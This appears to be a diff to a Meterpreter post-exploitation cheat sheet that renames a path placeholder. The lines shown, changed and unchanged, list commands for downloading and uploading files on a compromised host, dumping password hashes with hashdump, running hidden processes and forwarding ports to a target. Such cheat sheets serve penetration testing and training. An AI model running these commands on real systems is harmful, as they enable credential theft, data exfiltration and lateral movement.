@@ -1,10 +1,10 @@
 % meterpreter
 
 # download
-download <PATH>\\<FILE>
+download <PATH_TO>\\<FILE>
 
 #upload
-upload <FILE> <PATH>\\<FILE>
+upload <FILE> <PATH_TO>\\<FILE>
 
 # edit
 edit <FILE>
@@ -16,7 +16,7 @@ execute -H -f notepad.exe
 hashdump
 
 # search
-search -f <FILE>*.<EXTENSION> <PATH>\\
+search -f <FILE>*.<EXTENSION> <PATH_TO>\\
 
 # port forward
 portfwd add –l <LOCAL_PORT> –p <REMOTE_PORT> –r  <TARGET_IP>
